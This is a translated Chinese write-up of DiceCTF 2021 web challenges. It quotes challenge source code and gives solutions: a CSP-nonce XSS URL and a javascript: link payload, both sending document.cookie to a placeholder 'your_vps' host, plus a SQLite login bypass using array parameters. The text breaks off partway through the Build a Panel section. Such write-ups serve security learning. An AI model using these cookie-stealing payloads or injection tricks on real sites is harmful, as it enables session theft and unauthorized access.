# DiceCTF 2021 学习笔记
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前阵子做了一下 Dice CTF 2021，做出了几个 XSS ，本次就写一下包括复现题在内的所有学习笔记。
## Babier CSP
###  Description
[Baby CSP](https://2020.justctf.team/challenges/14) was too hard for us, try
Babier CSP.
[babier-csp.dicec.tf](https://babier-csp.dicec.tf/)
[Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp)
并给出如下附件：
    const express = require('express');
    const crypto = require("crypto");
    const config = require("./config.js");
    const app = express()
    const port = process.env.port || 3000;
    const SECRET = config.secret;
    const NONCE = crypto.randomBytes(16).toString('base64');
    const template = name => `
    ${name === '' ? '': `${name}`}
    View Fruit
    `;
    app.get('/', (req, res) => {
      res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
      res.send(template(req.query.name || ""));
    })
    app.use('/' + SECRET, express.static(__dirname + "/secret"));
    app.listen(port, () => {
      console.log(`Example app listening at http://localhost:${port}`)
    })
###  Solution
如上我们可以看到 CSP 设置的比较严格，但是对于 nonce ，只有在一开始的时候随机初始化了一次: `const NONCE =
crypto.randomBytes(16).toString('base64');` ，所以当运行的时候，nonce 不会改变。
所以我们可以直接查看页面的 nonce ，就可以直接得到 nonce
    View Fruit
而且注意到输入参数 name 会直接显示到 h1 标签当中，所以我们可以直接插入一个 script 标签即可执行 Javascript
代码了，这里注意一下用 url 编码把加号编码一下
然后用 vps 接一下 cookie 就行了
    https://babier-csp.dicec.tf/?name=%3Cscript%20nonce%3d%22g%2bojjmb9xLfE%2b3j9PsP/Ig==%22%3Ewindow.location=%22http://your_vps/?a=%22%2bencodeURIComponent(document.cookie);%3C/script%3E
    //secret=4b36b1b8e47f761263796b1defd80745
直接访问该 url ，可以拿到 flag
PS： 虽然这里说可以尝试 Adult CSP ，但是它竟然是个 Pwn 题…我就不去不自量力了。
## Missing Flavortext
###  Description
Hmm, it looks like there’s no flavortext here. Can you try and find it?
[missing-flavortext.dicec.tf](https://missing-flavortext.dicec.tf/)
并给出如下附件：
    const crypto = require('crypto');
    const db = require('better-sqlite3')('db.sqlite3')
    // remake the `users` table
    db.exec(`DROP TABLE IF EXISTS users;`);
    db.exec(`CREATE TABLE users(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT,
      password TEXT
    );`);
    // add an admin user with a random password
    db.exec(`INSERT INTO users (username, password) VALUES (
      'admin',
      '${crypto.randomBytes(16).toString('hex')}'
    )`);
    const express = require('express');
    const bodyParser = require('body-parser');
    const app = express();
    // parse json and serve static files
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static('static'));
    // login route
    app.post('/login', (req, res) => {
      if (!req.body.username || !req.body.password) {
        return res.redirect('/');
      }
      if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
        return res.redirect('/');
      }
      // see if user is in database
      const query = `SELECT id FROM users WHERE
        username = '${req.body.username}' AND
        password = '${req.body.password}'
      `;
      let id;
      try { id = db.prepare(query).get()?.id } catch {
        return res.redirect('/');
      }
      // correct login
      if (id) return res.sendFile('flag.html', { root: __dirname });
      // incorrect login
      return res.redirect('/');
    });
    app.listen(3000);
###  Solution
题目有一个比较明显的注入
    const query = `SELECT id FROM users WHERE
        username = '${req.body.username}' AND
        password = '${req.body.password}'
      `;
并且获得 flag 的条件是需要该查询语句得到结果即可
      if (id) return res.sendFile('flag.html', { root: __dirname });
但是数据库只存在一条记录，并且对于 admin 用户来说，密码是随机的，我们只能考虑一下怎么进行注入，使用万能密码即可，但是在前面用了一些措施过滤了单引号
      if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
        return res.redirect('/');
      }
很明显我们需要用一些方式绕过这个过滤注入单引号，可以尝试一下反斜杠，例如`username=1\&password=or 1;--`这样我们就可以构造成
    SELECT id FROM users WHERE username = '1\' AND password = 'or 1;--'
但是我们尝试之后并不可以，查资料发现，sqlite 对于单引号的转义方式是通过两个单引号的形式`''`，例如：
    INSERT INTO table_name (field1, field2) VALUES (123, 'Hello there''s');
所以我们需要尝试一些其他操作。后面我们可以发现使用数组进行绕过单引号的限制，例如：
    var a = ["admin'"];
    var b = "or 1=1;--"
    [a, b].some((v) => v.includes("'")) // false
所以我们可以这么构造用户名以及密码即可: `username[]=admin'&password=or 1--`
这样得到的 sql 语句即是
    SELECT id FROM users WHERE username = 'admin'' AND password = 'or 1--'
这样就可以查询得到结果了，也就可以拿到 flag 了
## Web Utils
###  Description
My friend made [this dumb tool](https://web-utils.dicec.tf/); can you try and
steal his cookies? If you send me a link, [I can pass it along](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=web-utils).
题目给出了附件地址：
###  Solution
题目构造了一个这么一个场景：题目存在有两个功能点，一个功能是提供短链接服务，将用户的长链接进行转换成短链接；一个功能是提供任意文本内容存储，将用户输入的存储，并返回一个短链接。
首先对于短链接功能，通过`createLink`函数进行操作，并对用户传入的 url 有限制，只允许 http|https 协议:
    const regex = new RegExp('^https?://');
    if (! regex.test(req.body.data))
      return rep
        .code(200)
        .header('Content-Type', 'application/json; charset=utf-8')
        .send({
        statusCode: 200,
        error: 'Invalid URL'
      });
接着使用`addData`函数将其与对应随机生成的 uuid 加入数据库当中：
    database.addData({ type: 'link', ...req.body, uid });
其中数据库相关操作为：
    const Database = require('better-sqlite3')
    const db = new Database('db.sqlite3')
    const init = () => {
      db.prepare(`CREATE TABLE IF NOT EXISTS data(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            data TEXT,
            type TEXT
            );`).run();
    }
    init();
    const statements = {
      getData: db.prepare(`SELECT data, type FROM data WHERE uid = ?;`),
      addData: db.prepare(`INSERT INTO data (uid, data, type) VALUES (?, ?, ?);`)
    }
    module.exports = {
      getData: ({ uid }) => {
        return statements.getData.get(uid);
      },
      addData: ({ uid, data, type }) => {
        statements.addData.run(uid, data, type);
      },
      generateUid: (length) => {
        const characters =
          'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const arr = [];
        for (let i = 0; i 
进入到该页面后通过 /api/data/xxxxxxxx 获取链接内容，例如 /api/data/gyyO0ZXe 得到一个 json ：
    {"statusCode":200,"data":"http://baidu.com","type":"link"}
然后我们可以看到页面使用 `window.location` 的方式进行 url 跳转实现短链接的功能。
再看到 Paste 内容存储功能，通过`createPaste`
函数进行操作，对用户传入的数据并没有限制，并且与短链接存储方式使用相同的`addData`函数进行操作插入数据库：
    database.addData({ type: 'paste', ...req.body, uid });
查看的时候也使用与短链接同样的形式，例如： /view/doKS38NE ，通过 /api/data/doKS38NE 获取内容 json ：
    {"statusCode":200,"data":"wuhu","type":"paste"}
由页面 JS 通过 `document.querySelector('div').textContent = data;` 的形式输出的页面上。
由题目形式知道，这题必然是一个 XSS
的题目，虽然我们可以存储任意内容，但是使用`textContent`输出的内容会自动将标签符号进行转义，并且输出点还在一个 div 标签内，无法直接进行
XSS
并且纵观整个 /view 的页面内容，这几乎是我们可以进行 XSS
唯一的地方，仔细审计我们找到通过`window.location=javascript:alert(1)`的形式执行 javascript
代码，但是使用该功能的前提是需要短链接的形式，并且短链接开头只能由 http|https 开头，并不能使用 javascript
，并且是使用了`RegExp('^https?://')`的正则形式，我们并不能直接绕过这个正则，所以我们需要找个什么办法绕过这个限制。
在数据库操作我们注意到两个操作方式都使用的是同一个函数`addData`，该函数是通过`type`参数来判断插入的类型内容，并且我们注意到两个功能传入该函数都使用的是
`...req.body`
三个点这个操作符是一个展开语法，叫做 Spread syntax ，可以在函数调用/数组构造时, 将数组表达式或者 string
在语法层面展开；还可以在构造字面量对象时, 将对象表达式按 key-value 的方式展开。例如：
    function sum(x, y, z) {
      return x + y + z;
    }
    const numbers = [1, 2, 3];
    console.log(sum(...numbers));
    // expected output: 6
    console.log(sum.apply(null, numbers));
    // expected output: 6
对于`...req.body`，我们不难想到如果我们使用相同的 key ，会怎么样呢？例如
    function addData({ uid, data, type }) {
        console.log(uid, data, type);
    }
    var uid = "uid";
    var a = { data: "wuhu", type: "link" };
    addData({ type: "paste", ...a, uid });
    // output: uid wuhu link
可以看到我们使用一个自己的 type 字段覆盖了之前的 type 字段，这样我们就可以成功控制插入的类型。所以我们大概可以有个思路：我们通过构造一个有
`type: "link"` 的特殊 json ，利用`createPaste`函数帮我们插入一个 link
类型的数据，这样得到的短链接内容就是一个我们可以自己控制内容的 link 类型的了。
所以我们可以在 `createPaste` 的 API 再传入一个 `type: 'link'` ，这样就可以覆盖掉了前面的 `type: 'paste'`
就可以得到一个触发 XSS 的短链接了
    {"data":"javascript:window.location='https://your_vps/?a='+encodeURIComponent(document.cookie);","type":"link"}
这样再将得到的链接地址，使用 /view API 发给 admin 看就可以拿到 flag 了，例如我们在给 createPaste API
发送以上内容后，得到的是
    {"statusCode":200,"data":"otEJvitt"}
这时再将  发给 admin 就可以了
## Build a Panel
###  Description
You can never have too many widgets and BAP organization is the future. If you
experience any issues, send it [here](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=build-a-panel)
Site: [build-a-panel.dicec.tf](https://build-a-panel.dicec.tf/)
附件地址：
###  Solution
在做这个题的时候，已经放出了这个题目的 Fixed 版本 Build a Better Panel
，众所周知，这种情况肯定是有非预期了，而且非预期还可能异常简单。所以我们把 Fixed 版本的题目附件下下来 diff 一下，就可以发现一些蛛丝马迹了。
其中经过 diff 之后我们发现主要修改的地方就是将 admin cookie 中的 `sameSite: 'lax'` 改成了 `sameSite:
'strict'`，如果不了解 sameSite Cookie，我们可以简单看一下介绍 [SameSite
Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
> ​ `SameSite` 接受下面三个值：
>
> **Lax**
>
> Cookies允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送。这是浏览器中的默认值。
>
> **Strict**
>
> Cookies只会在第一方上下文中发送，不会与第三方网站发起的请求一起发送。
>
> **None**
>